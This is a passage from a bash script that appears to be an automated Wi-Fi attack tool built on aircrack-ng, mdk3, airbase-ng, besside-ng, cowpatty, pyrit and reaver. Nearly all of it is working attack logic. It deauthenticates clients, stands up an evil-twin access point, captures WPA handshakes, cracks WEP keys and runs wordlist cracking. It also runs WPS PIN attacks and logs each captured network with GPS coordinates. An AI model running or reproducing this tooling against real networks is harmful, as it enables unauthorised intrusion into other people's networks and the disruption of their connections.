					gnome-terminal -t "mdk3 on $NIC" --geometry=60x20+720+320 -x mdk3 $MON1 d -b $HOME/BSSIDB&
					sleep 5 && killall mdk3 2> /dev/null&
					sleep 8
				fi
			else
				if [ $EVIL -z ] 2> /dev/null
				then
					if [ $MDK -z ] 2> /dev/null
					then
						iw $MON2 set channel $CHAN
						MACNUM=0
						for CLIENT in $TARGETS
						do
							MACNUM=$((MACNUM + 1))
							echo
							aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
							sleep $((PACKS + 1))'.5'
							echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
							fanalyze
							if [ $GDONE = 1 ] 2> /dev/null
							then
								break
							fi
						done
							sleep 3
					else
						echo $BSSID > $HOME/BSSIDB
						gnome-terminal -t "MDK3 on $NIC2" --geometry=60x20+720+320 -x mdk3 $MON2 d -c $CHAN -b $HOME/BSSIDB&
						sleep 5 && killall mdk3 2> /dev/null&
						sleep 8
					fi
				else
					if [ $CHKBASE -z ] 2> /dev/null
					then
						CHKBASE=1
					fi
					echo;echo $RED" [*]$GRN Evil Twin $ESSID$RED Launched on $GRN$NIC2" 
					FAKEMAC=${BSSID:0:12}'13:37'
					gnome-terminal -t "Evil Twin $ESSID listening on $NIC2.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $FAKEMAC -i $MON2 -I 50 -F $HOME/tmpe $MON2&
					sleep 2
					MACNUM=0

					for CLIENT in $TARGETS
					do
						MACNUM=$((MACNUM + 1))
						echo
						aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
						sleep $PACKS
						echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
						fanalyze
						if [ $GDONE = 1 ] 2> /dev/null
						then
							break
						fi
					done
					sleep 7
				fi
						
			fi
		else
			echo
			echo $BLU" [*] Besside-ng working now.."$GRN
			echo
			if [ $WEP = 1 ] 2> /dev/null
			then
				sleep 0.5
				iw $MON1 set channel $CHAN
				sleep 0.5
				besside-ng -b $BSSID -c $CHAN $MON1
				WEPKEY=$(cat besside.log | grep "$ESSID" | cut -d '|' -f 2)
				if [ $WEPKEY -z ] 2> /dev/null
				then
					echo $RED" [*] KEY NOT FOUND"
					rm -rf besside.log;rm -rf wep.cap;rm -rf wpa.cap 2> /dev/null
					fexit
				else
					echo $GRN" [*] $RED$ESSID$GRN WEP KEY CRACKED:$WEPKEY"
					echo " [*] Key saved to: $OUTDIR/got"
					echo
					if [ $GPS = 1 ] 2> /dev/null
					then
						fgetgps
						echo -e "$ESSID\tBSSID:$BSSID\tCH:$CHAN\t$LOCATION$URL WEP KEY:$WEPKEY" >> $OUTDIR/got
					else
						echo -e "$ESSID\tBSSID:$BSSID\tCH:$CHAN\t$LOCATION$URL WEP KEY:$WEPKEY" >> $OUTDIR/got
				fi
				rm -rf besside.log;rm -rf wep.cap;rm -rf $HOME/tmp* 2> /dev/null;rm -rf wpa.cap 2> /dev/null
				if [ $DO = 'A' ] 2> /dev.null
				then
					fbotstart
				else
					fexit
				fi
			fi	
		else
			sleep 0.5
			iw $MON1 set channel $CHAN
			sleep 0.5
			besside-ng -W -b $BSSID -c $CHAN $MON1
			mv wpa.cap $HOME/tmp-01.cap
			fanalyze
		fi
	ESSID=$(echo $ESSID | sed 's/ /_/g')
	sleep 0.5
	rm -rf besside.log;rm -rf wep.cap; rm -rf wpa.cap 2> /dev/null
	fi
	if [ $GDONE -z ] 2> /dev/null
	then
		fanalyze
	fi
	if [[ $DO = 'A' || $DEAU = "1" ]] 2> /dev.null
	then
		DECNT=$((DECNT + 1))
	fi
	if [ $GDONE = "1" ] 2> /dev/null
	then
		DONE=1
	else
		echo
		echo $RED" [*] No handshake detected [*] "$RST
		if [ $SILENT -z ] 2> /dev/null
		then
			beep -f 100 -l 100;beep -f 50 -l 100
		fi
		echo
		if [ $EVIL = 1 ] 2> /dev/null
		then
			killall airbase-ng 2> /dev/null
			rm -rf $HOME/tmpe-01.cap
		fi
		sleep 0.2
		DONE=""
		if [ $DECNT -ge $TRIES ] 2> /dev/null
		then
			if [ $DO = 'A' ] 2> /dev/null
			then
				if [ $EVIL = 1 ] 2> /dev/null
				then
					CHKBASE=""
					killall airbase-ng 2> /dev/null
				fi
				rm -rf $HOME/tmp*
				fbotstart
			else
				killall airodump-ng
				if [ $EVIL = 1 ] 2> /dev/null
				then
					CHKBASE=""
				fi
				fexit
			fi
		fi
	fi
				
	done

	echo
	killall airodump-ng 2> /dev/null
	if [ $SILENT -z ] 2> /dev/null
	then
		beep -f 1200 -l 3 -r 2;beep -f 1500 -l 3 -r 1;beep -f 1600 -l 5 -r 1;beep -f 1800 -l 3 -r 1;beep -f 1200 -l 3 -r 2;beep -f 1500 -l 3 -r 1;beep -f 1600 -l 5 -r 1;beep -f 1800 -l 3 -r 1
	fi
	echo $GRN" [*] Handshake capture was successful! [*] "
	echo
	ESSID=$(echo $ESSID | sed 's/ /_/g')
	CHKBASE=""
	DATE=$(date +%Y%m%d)
	if [ $EVIL = 1 ] 2> /dev/null
	then
		if [ $EDONE = 1 ] 2> /dev/null
		then
			killall airbase-ng 2> /dev/null
			cp $HOME/tmpe-01.cap $OUTDIR/$ESSID-$DATE.cap
		else
			killall airbase-ng 2> /dev/null
		fi
		echo " [*] Handshake saved to$BLU $OUTDIR/$ESSID-$DATE.cap$GRN [*] "
	else
		echo " [*] Handshake saved to$BLU $OUTDIR/$ESSID-$DATE.cap$GRN [*] "
	fi
	echo
	if [ $GPS = 1 ] 2> /dev/null
	then
		if [ $(cat $HOME/gpslog | grep LL) -z ] 2> /dev/null
		then
			echo $RED" [*] GPS Not ready yet!"
			echo
		else
			fgetgps
		fi
	fi
	if [ $EVIL = 1 ] 2> /dev/null
	then
		if [ $DO = 'A' ] 2> /dev/null
		then
			echo -e "$ESSID\tBSSID:$BSSID\tCH:$CHAN\t$LOCATION$URL" >> $OUTDIR/got
		fi
	else
		echo -e "$ESSID\tBSSID:$BSSID\tCH:$CHAN\t$LOCATION$URL" >> $OUTDIR/got

		if [ $EDONE -z ] 2> /dev/null
		then
			echo $GRN" [*] $(pyrit -r $HOME/tmp-01.cap -o "$OUTDIR/$ESSID-$DATE.cap" strip | grep 'New pcap-file')"$RST;echo
		else
			echo $GRN" [*] $(pyrit -r $HOME/tmpe-01.cap -o "$OUTDIR/$ESSID-$DATE.cap" strip | grep 'New pcap-file')"$RST;echo
		fi
	fi
	sleep 0.4
	EDONE="";GDONE="";TARGETS="";BSSIDS="";LOCATION="";URL=""
	rm -rf $HOME/tmp*
	sleep 2
	if [ $DO = 'A' ] 2> /dev.null
	then
		fbotstart
	else
		if [ $WORDLIST -z ] 2> /dev/null
		then
			echo $BLU" [>] Do you want to crack $GRN$ESSID$BLU now? [Y/n] "
			read -p "  >" DOCRK
			echo $RST
			case $DOCRK in
				"")fcrack;;
				"Y")fcrack;;
				"y")fcrack;;
			esac
			fexit
		else
			fcrack
		fi
	fi
}		

fanalyze()																#Analyze pcap for handshakes
{
	GDONE="";EDONE="";ANALYZE="";ANALYZE2=""
	if [ -f $HOME/tmp-01.cap ] 2> /dev/null
	then
		ANALYZE=$(cowpatty -r $HOME/tmp-01.cap -c)
	else
		ANALYZE='fff'
	fi
	if [ $NIC2 -z ] 2> /dev/null
	then
		A=1
	else
		if [ -f $HOME/tmpe-01.cap ] 2> /dev/null
		then
			ANALYZE2=$(cowpatty -r $HOME/tmpe-01.cap -c)
		else
			ANALYZE2='fff'
		fi
		if  [ $(echo "$ANALYZE2" | grep Collected) -z ] 2> /dev/null
		then
			A=1
		else
			GDONE=1
			EDONE=1
		fi
	fi
	if  [ $(echo "$ANALYZE" | grep Collected) -z ] 2> /dev/null
	then
		A=1
	else 
		GDONE=1
	fi
}

fcrack()																#Crack handshakes
{
	PFILE=$OUTDIR/$ESSID-$DATE".cap"
	ESSID=$(echo "$ESSID" | sed 's/_/ /g')
	clear
	if [ $WORDLIST -z ] 2> /dev/null
	then
		clear
		echo $BLU" [>] Please enter the full path of a wordlist to use. "
		read -e -p "  >"$RED WORDLIST
	fi
	if [ ! -f $WORDLIST ] 2> /dev/null
	then
		$COLOR 1;$COLOR2 9;echo " [*] ERROR: $WORDLIST not found, try again..";$COLOR 9
		WORDLIST=""
		sleep 1
		fcrack
	else
		if [ $CRACK = "1" ] 2> /dev/null
		then
			echo $BLU
			aircrack-ng -q -w $WORDLIST $PCAP
			echo $RST
		else
			echo $BLU
			cowpatty -f $WORDLIST -s "$ESSID" -r $PFILE
			echo $RST
		fi
	fi
	fexit
}

fstartgps()																#Configure GPS
{
	clear
	echo $GRN""" [*] On your$RED Android$GRN phone:$BLU
 [1] Enable GPS
 [2] Download BlueNMEA from the Google Play store and run it
 [3] Connect usb cable to laptop and enable usb tethering$GRN

 [*] On your$RED Laptop$GRN:$BLU
 [1] Disconnect from any wifi
 [2] Turn any firewalls off
 [3] Connect to your phone AP
"
	read -p $GRN"  >Press enter to continue once connected< "
	echo
	echo $BLU" [*] Checking GPS status"
	PHONEIP=$(route -n | grep Gate -A 1 | grep 0 | cut -d '0' -f 5 | sed 's/^ *//g')
	gpspipe -d -r "$PHONEIP:4352" -o $HOME/gpslog&
	LCNT=0
	while [ $LDONE -z ] 2> /dev/null
	do
		sleep 0.4
		LDONE=$(cat $HOME/gpslog)
		LCNT=$((LCNT + 1))
		if [ $LCNT -ge 25 ] 2> /dev/null
		then
			echo;$COLOR2 9;$COLOR 1;echo " [*] ERROR: Something went wrong, could not connect to android GPS server."$RST
			fexit
		fi
	done
	clear
	echo $RED""" [>]$GRN SATELLITE UPLINK ESTABLISHED$RED [<]$GRN

 [*] GPS tagging enabled!, co-ordinates will appear in $OUTDIR/got
 [*] We get GPS once the$RED icon is locked in$GRN on your android!"
	sleep 3
}
	
fgetgps()
{
	LOCATION=$(cat $HOME/gpslog | grep LL | tail -1 | cut -d ',' -f 2-5)
	MINS1=$(echo $LOCATION | cut -d '.' -f 1 | tail -c 3)
	DEGS1=$(echo $LOCATION | cut -d '.' -f 1)
	DEGS1=${DEGS1:0:-2}
	SECSA="."$(echo $LOCATION | cut -d ',' -f 1 | cut -d '.' -f 2)
	SECS1=$(echo "$SECSA"*60 | bc)
	MINS2=$(echo $LOCATION | cut -d ',' -f 3 | cut -d '.' -f 1 | tail -c 3)
	DEGS2=$(echo $LOCATION | cut -d '.' -f 2 | cut -d ',' -f 3)
	DEGS2=${DEGS2:0:-2}
	SECSB="."$(echo $LOCATION | cut -d ',' -f 3 | cut -d '.' -f 2)
	SECS2=$(echo "$SECSB"*60 | bc)
	FIRST=$(echo $LOCATION | cut -d ',' -f 2)
	SECOND=$(echo $LOCATION | cut -d ',' -f 4)
	URL="nearby.org.uk/coord.cgi?p=$FIRST+$DEGS1%B0+$MINS1$SECSA+$SECOND+$DEGS2%B0+$MINS2$SECSB"
	DEGS1=$DEGS1'°'
	DEGS2=$DEGS2'°'
	case $FIRST in
		"N")FIRST='North';;
		"E")FIRST='East';;
		"S")FIRST='South';;
		"W")FIRST='West'
	esac
	
	case $SECOND in
		"N")SECOND='North';;
		"E")SECOND='East';;
		"S")SECOND='South';;
		"W")SECOND='West'
	esac
	
	echo """ [*] Current location:
 $RED[$GRN@$RED]$GRN $DEGS1 $RED$FIRST $GRN$MINS1$RED Minutes $GRN$SECS1$RED Seconds $GRN
 $RED[$GRN@$RED]$GRN $DEGS2 $RED$SECOND $GRN$MINS2$RED Minutes $GRN$SECS2$RED Seconds $GRN
 
 $RED[$GRN@$RED]$GRN Map URL: $URL
"
	LOCATION="$DEGS1 $FIRST $MINS1 Minutes $SECS1 Seconds, $DEGS2 $SECOND $MINS2 Minutes $SECS2 Seconds"
	URL=' - '$URL
}

freaver()
{
	clear
	echo $BLU" [*] Scanning for vulnerable WPS APs.."
	wash -i $MON1 -o wash.log&
	sleep 15 && killall wash && sleep 1 && clear
	ESSIDS="$(cat wash.log | grep : | cut -d ' ' -f 59 | sort -u)"
	echo $GRN" [>] Please choose an AP:"$BLU
	NUM=0
	for ESSID in $ESSIDS
	do
		NUM=$((NUM + 1))
		echo " [$NUM] $ESSID"
	done
	read -p $GRN"  >" AP
	AP=$(( AP + 1 ))
	ESSID=$(echo "$ESSIDS" | sed -n "$AP"p)
	BSSID=$(cat wash.log | grep $ESSID | cut -d ' ' -f 1)
	CHAN=$(cat wash.log | grep $ESSID | cut -d ' ' -f 8)
	if [ $CHAN -z ] 2> /dev/null
	then
		CHAN=$(cat wash.log | grep $ESSID | cut -d ' ' -f 7)
	fi
	rm -rf wash.log
	echo $BLU
	reaver -i $MON1 -c $CHAN -b $BSSID -a -w -v
	fexit ' '
}

fexit()																	#Exit
{
	killall mdk3 2> /dev/null
	killall aircrack-ng 2> /dev/null
	killall airbase-ng 2> /dev/null
	killall airodump-ng 2> /dev/null
	killall besside-ng 2> /dev/null
	rm -rf $HOME/tmp* 2> /dev/null
	rm -rf besside.log 2> /dev/null
	rm -rf wep.cap 2> /dev/null
	rm -rf wpa.cap 2> /dev/null
	if [ $CRACK = "1" ] 2> /dev/null
	then
		echo $RED" [*]$GRN Goodbye...$RST"
		exit
	else
		MOND="$(ifconfig | grep mon | cut -d ' ' -f 1)"
		if [ $MOND -z ] 2> /dev/null
		then
			A=1
		else
			echo $GRN
			for NIC in $MOND
			do
				airmon-ng stop $NIC | grep remodertd
				echo " [*] Monitor $NIC removed. "
			done
		fi
		echo
		if [ $GPS = 1 ] 2> /dev/null
		then	
			killall -9 gpspipe 2> /dev/null
			rm -rf $HOME/gpslog
			echo $RED" [*]$GRN Android GPS$RED shutting down..."
			rm -rf $HOME/BSSIDF 2> /dev/null
			echo
		else
			/etc/init.d/networking start
			service network-manager start
		fi
		echo $RED" [*] All monitor devices have been shut down,$GRN Goodbye...$RST"
		exit
	fi
}

trap fexit 2
																		#Parse command line arguments
if [ $# -lt 1 ] 2> /dev/null
then
	fhelp
fi

ACNT=1
for ARG in $@
do
	ACNT=$((ACNT + 1))
	case $ARG in "-r")DO='R';;"-v")VERBOSE=1;;"-W")WEP=1;;"-B")BESS=1;;"-d")PACKS=$(echo $@ | cut -d " " -f $ACNT);;"-M")MDK=1;;"-E")EVIL=1;;"-g")GPS=1;;"-i2")NIC2=$(echo $@ | cut -d " " -f $ACNT);;"-s")SILENT=1;;"-o")OUTDIR=$(echo $@ | cut -d " " -f $ACNT);;"-p")POWERLIMIT=$(echo $@ | cut -d " " -f $ACNT);;"-T")DEAU=1;TRIES=$(echo $@ | cut -d " " -f $ACNT);;"-c")CRACK=1;PCAP=$(echo $@ | cut -d " " -f $ACNT);;"-l")DO='L';;"-h")fhelp;;"-e")DO='E';ACNT=$((ACNT - 1));PARTIALESSID=$(echo $@ | cut -d " " -f $ACNT);;"-i")NIC=$(echo $@ | cut -d " " -f $ACNT);;"-w")WORDLIST=$(echo $@ | cut -d " " -f $ACNT);;"-a")DO='A';;"")fstart;esac
done
fstart
